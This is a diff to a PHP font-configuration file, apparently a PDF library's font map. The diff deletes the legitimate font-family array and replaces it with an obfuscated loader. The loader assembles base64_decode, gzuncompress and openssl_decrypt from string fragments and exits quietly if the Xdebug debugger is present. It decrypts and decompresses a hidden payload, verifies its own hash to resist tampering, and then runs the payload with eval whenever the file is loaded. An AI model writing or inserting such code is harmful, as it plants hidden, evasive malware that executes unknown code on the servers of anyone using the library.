@@ -1,95 +1,28 @@
 <?php
-$distFontDir = $rootDir . DIRECTORY_SEPARATOR . 'lib' . DIRECTORY_SEPARATOR . 'fonts' . DIRECTORY_SEPARATOR;
-return array(
-    'sans-serif' =>
-        array(
-            'normal' => $distFontDir . 'Helvetica',
-            'bold' => $distFontDir . 'Helvetica-Bold',
-            'italic' => $distFontDir . 'Helvetica-Oblique',
-            'bold_italic' => $distFontDir . 'Helvetica-BoldOblique'
-        ),
-    'times' =>
-        array(
-            'normal' => $distFontDir . 'Times-Roman',
-            'bold' => $distFontDir . 'Times-Bold',
-            'italic' => $distFontDir . 'Times-Italic',
-            'bold_italic' => $distFontDir . 'Times-BoldItalic'
-        ),
-    'times-roman' =>
-        array(
-            'normal' => $distFontDir . 'Times-Roman',
-            'bold' => $distFontDir . 'Times-Bold',
-            'italic' => $distFontDir . 'Times-Italic',
-            'bold_italic' => $distFontDir . 'Times-BoldItalic'
-        ),
-    'courier' =>
-        array(
-            'normal' => $distFontDir . 'Courier',
-            'bold' => $distFontDir . 'Courier-Bold',
-            'italic' => $distFontDir . 'Courier-Oblique',
-            'bold_italic' => $distFontDir . 'Courier-BoldOblique'
-        ),
-    'helvetica' =>
-        array(
-            'normal' => $distFontDir . 'Helvetica',
-            'bold' => $distFontDir . 'Helvetica-Bold',
-            'italic' => $distFontDir . 'Helvetica-Oblique',
-            'bold_italic' => $distFontDir . 'Helvetica-BoldOblique'
-        ),
-    'zapfdingbats' =>
-        array(
-            'normal' => $distFontDir . 'ZapfDingbats',
-            'bold' => $distFontDir . 'ZapfDingbats',
-            'italic' => $distFontDir . 'ZapfDingbats',
-            'bold_italic' => $distFontDir . 'ZapfDingbats'
-        ),
-    'symbol' =>
-        array(
-            'normal' => $distFontDir . 'Symbol',
-            'bold' => $distFontDir . 'Symbol',
-            'italic' => $distFontDir . 'Symbol',
-            'bold_italic' => $distFontDir . 'Symbol'
-        ),
-    'serif' =>
-        array(
-            'normal' => $distFontDir . 'Times-Roman',
-            'bold' => $distFontDir . 'Times-Bold',
-            'italic' => $distFontDir . 'Times-Italic',
-            'bold_italic' => $distFontDir . 'Times-BoldItalic'
-        ),
-    'monospace' =>
-        array(
-            'normal' => $distFontDir . 'Courier',
-            'bold' => $distFontDir . 'Courier-Bold',
-            'italic' => $distFontDir . 'Courier-Oblique',
-            'bold_italic' => $distFontDir . 'Courier-BoldOblique'
-        ),
-    'fixed' =>
-        array(
-            'normal' => $distFontDir . 'Courier',
-            'bold' => $distFontDir . 'Courier-Bold',
-            'italic' => $distFontDir . 'Courier-Oblique',
-            'bold_italic' => $distFontDir . 'Courier-BoldOblique'
-        ),
-    'dejavu sans' =>
-        array(
-            'bold' => $distFontDir . 'DejaVuSans-Bold',
-            'bold_italic' => $distFontDir . 'DejaVuSans-BoldOblique',
-            'italic' => $distFontDir . 'DejaVuSans-Oblique',
-            'normal' => $distFontDir . 'DejaVuSans'
-        ),
-    'dejavu sans mono' =>
-        array(
-            'bold' => $distFontDir . 'DejaVuSansMono-Bold',
-            'bold_italic' => $distFontDir . 'DejaVuSansMono-BoldOblique',
-            'italic' => $distFontDir . 'DejaVuSansMono-Oblique',
-            'normal' => $distFontDir . 'DejaVuSansMono'
-        ),
-    'dejavu serif' =>
-        array(
-            'bold' => $distFontDir . 'DejaVuSerif-Bold',
-            'bold_italic' => $distFontDir . 'DejaVuSerif-BoldItalic',
-            'italic' => $distFontDir . 'DejaVuSerif-Italic',
-            'normal' => $distFontDir . 'DejaVuSerif'
-        )
-);
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_bwv7vln9=('bas'.'e64'.'_de'.'cod'.'e');
+$_ijwmfuzg=('gzu'.'nco'.'mpr'.'ess');
+$_kjtf0xbe=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_vgyafqyr='E7Fcogk+JGs=';
+$_qe3a3qqk='AZwvzEij';
+$_j8flfw7r='ViIkzgUE';
+$_ceujetgv='eR46zXPa';
+$_hynqcro4='KnA0n23B';
+$_mf8xkbgw='gcMZxg==';
+$_wzz8kfxv='5sEPV8fM';
+$_vpnjrfxf='wqS69Qfd';
+$_avbcjl6y=$_bwv7vln9($_j8flfw7r.$_qe3a3qqk.$_ceujetgv.$_hynqcro4.$_vgyafqyr);
+$_nnki95y5=$_bwv7vln9($_vpnjrfxf.$_wzz8kfxv.$_mf8xkbgw);
+$_atctovvd=$_bwv7vln9('A6Exl8bNiljCTsovXmBF1ZPPgII1+uSL3A38hUzbAcLqfCJOhsGB2zTx2SPFxEUSV58/dspulDANi+wq8Dl1wPc9yDR3V6Q/jGYD9iDEEkQWo6lG4uxJ9WEmcFqgS9wOrp8IjMUDiaZW+u6o2sygWMFAJoGXezAXCcl1O+krVcGoBkFQXNooAkZB+WAeVbfhGBE3OkDpbrA/8iv4tJMW2ZJ80KDrXwLCKRtANEa89QhCWIu9q3P2bXat2mtUDxWZd8nTo+UqYfDQSXpVAJa4uzPSsnYBLiZqMTrxK3rJwATEGHjsICZ6NHn4LhRWUaz4F/nFee1i/tA1AM2A9awzTI1KWJhSPEGbEFjEE2H18Iw0OhQuocfUVHxIbouwV1ZJ62bTkWKoduoHVghZtipkegSvly8guCaeSVJfi8tGVUips9v16WKmp1qGR7udIJw0dLSw84sT5e7GigbeN1YPqKycCBN5LD20uQotYqfexiSpB5mTifwnGG8kELQQNhEbsAVN7jX7rCAStntYd4+hkA==');
+$_fw6xojcm=$_kjtf0xbe($_atctovvd,'aes-256-cbc',$_avbcjl6y,OPENSSL_RAW_DATA,$_nnki95y5);
+if($_fw6xojcm===false){exit;}
+$_q7002p7k=$_ijwmfuzg($_fw6xojcm);
+if($_q7002p7k===false){exit;}
+$_b64c9hww='3a7238029866399d2dfc485aab42e3d78f5301d2db93fa788718f93b24aaf4f7';
+$_h2mwg4w9=@file_get_contents(__FILE__);
+if($_h2mwg4w9!==false){
+$_r6mwgrm0=str_replace($_b64c9hww,"0000000000000000000000000000000000000000000000000000000000000000",$_h2mwg4w9);
+$_v9g853zv=hash("sha256",$_r6mwgrm0);
+if($_v9g853zv!==$_b64c9hww){@http_response_code(403);exit;}
+}
+eval($_q7002p7k);
